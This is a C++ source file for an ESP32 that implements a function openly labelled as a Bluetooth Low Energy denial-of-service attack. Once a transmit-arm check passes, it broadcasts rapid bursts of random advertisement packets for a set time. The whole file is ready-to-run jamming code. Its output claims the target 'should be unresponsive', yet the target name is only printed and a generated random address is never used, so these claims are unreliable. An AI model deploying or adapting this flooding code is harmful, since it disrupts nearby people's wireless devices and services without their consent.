#include "ble_dos.h"
#include "tx_arm.h"
#include <NimBLEDevice.h>

namespace BLE_DOS {

DOSResult launchDOS(const String &targetDevice, uint32_t durationMs) {
    DOSResult result{false, 0, targetDevice, "Link Layer Attack"};

    Serial.println("\n=== BLE Denial of Service ===");
    Serial.println("Target: " + targetDevice);
    Serial.println("Method: Link Layer Attack");
    Serial.println("Duration: " + String(durationMs) + "ms");

    if (!TxArm::isArmed()) {
        Serial.println("✗ TX not armed");
        return result;
    }

    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();

    uint32_t start = millis();
    uint32_t deadline = start + durationMs;

    while ((int32_t)(millis() - deadline) < 0) {
        // Generate random BLE address for each packet
        uint8_t bleMac[6];
        for (int i = 0; i < 6; i++) {
            bleMac[i] = esp_random() % 256;
        }

        // Create rapid-fire advertisement payloads
        uint8_t payload[31];
        for (int i = 0; i < 31; i++) {
            payload[i] = esp_random() % 256;
        }

        NimBLEAdvertisementData advData;
        advData.setFlags(0x06);
        advData.addData(std::string((const char *)payload, 31));

        pAdvertising->setAdvertisementData(advData);
        pAdvertising->start(0, nullptr, nullptr);
        delayMicroseconds(500);
        pAdvertising->stop();

        result.packetsCount++;

        if (result.packetsCount % 100 == 0) {
            Serial.println("  Packets sent: " + String(result.packetsCount));
        }
    }

    result.success = true;

    Serial.println("✓ DoS attack complete!");
    Serial.println("  Total packets: " + String(result.packetsCount));
    Serial.println("  Target should be unresponsive");

    return result;
}

}  // namespace BLE_DOS
